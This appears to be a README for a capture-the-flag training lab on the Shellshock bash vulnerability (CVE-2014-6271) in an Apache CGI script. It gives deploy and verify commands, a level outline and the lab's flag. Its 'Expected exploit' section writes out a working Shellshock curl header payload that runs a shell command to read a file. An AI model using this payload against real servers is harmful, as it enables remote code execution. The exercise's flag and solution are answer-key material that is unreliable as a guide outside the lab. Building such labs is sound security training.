# shellshock — CVE-2014-6271 Apache CGI Remote Code Execution

**Vulnerability:** Shellshock — bash parses function definitions in environment variables, allowing code injection via HTTP headers  
**Tool:** `curl`  
**Flag:** `WMG{sh3llsh0ck_cve_2014_6271_env_vars_are_scary}`

## Scenario

A legacy CGI script (`/cgi-bin/status.cgi`) runs under Apache. The target uses
an unpatched bash that evaluates injected function definitions passed via HTTP
headers (`User-Agent`, `Referer`, etc.) as environment variables.

## Deploy

```bash
ansible-playbook -i inventory/hosts.ini games/shellshock/setup.yml
```

First run: `ok=13 changed=10`  
Second run: `ok=11 changed=0` (idempotent)

## Verify

```bash
./agent-harness/verify.sh shellshock
```

## Expected exploit

```bash
curl -H 'User-Agent: () { :; }; echo; echo; /bin/cat /opt/flag.txt' \
  http://127.0.0.1/cgi-bin/status.cgi
# → WMG{sh3llsh0ck_cve_2014_6271_env_vars_are_scary}
```

## Training

`training.json` — 9 levels: port scan → service fingerprint → CGI discovery → Shellshock theory → exploit → flag → ASSESSMENT.  
MITRE ATT&CK: T1190 (Exploit Public-Facing Application), T1059.004 (Unix Shell).  
Student-facing materials: see `briefing.md`, `hints.md`, `solution.md`.
